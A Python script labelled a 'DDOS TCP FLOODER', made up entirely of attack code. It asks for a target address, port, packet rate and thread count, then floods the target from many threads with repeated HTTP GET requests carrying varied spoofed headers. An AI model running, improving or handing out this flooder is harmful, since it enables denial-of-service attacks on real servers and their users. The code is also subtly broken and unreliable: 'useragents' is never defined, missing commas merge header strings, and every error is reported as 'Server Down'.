# DDOS TCP FLOODER
# v0.0.9 BETA

import socket
import random
import threading

ref=['http://www.bing.com/search?q=',
	'https://www.yandex.com/yandsearch?text=',
	'https://duckduckgo.com/?q=',
 	'https://www.google.com/search?client=opera-gx&q=google&sourceid=opera&ie=UTF-8&oe=UTF-8',
  	'https://www.yahoo.com']

acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
            "Accept-Encoding: gzip, deflate\r\n",
            "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
            "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
            "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
            "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
            "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
            "Accept-Language: en-US,en;q=0.5\r\n"
			"Accept-Encoding: gzip, compress, br\r\n"
			"Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n"
   			"Accept-Post: text/turtle, application/ld+json\r\n"
      		"Accept-Encoding: br;q=1.0, gzip;q=0.6, *;q=0.1\r\n"
        	"Access-control-allow-credentials: true \r\nAccess-control-allow-origin: https://www.vedbex.com\r\n"]

ip = str(input('[+] Target: '))
port = int(input('[+] Port: '))
pack = int(input('[+] Packet/s: '))
thread = int(input('[+] Threads: '))

def start():
    global useragents, ref, acceptall
    hh = random._urandom(3016)
    xx = int(0)
    useragents = "User-Agent: "+random.choice(useragents)+"\r\n"
    accept = random.choice(acceptall)
    reffer = "Referer: "+random.choice(ref)+str(ip) + "\r\n"
    content    = "Content-Type: application/x-www-form-urlencoded\r\n"
    length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
    target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
    main_req  = target_host + useragents + accept + reffer + content + length + "\r\n"
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(ip),int(port)))
            s.send(str.encode(main_req))
            for i in range(pack):
                s.send(str.encode(main_req))
            xx += random.randint(0, int(pack))
            print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
        except:
            s.close()
            print('[+] Server Down.')
            
for x in range(thread):
        thred = threading.Thread(target=start)
        thred.start()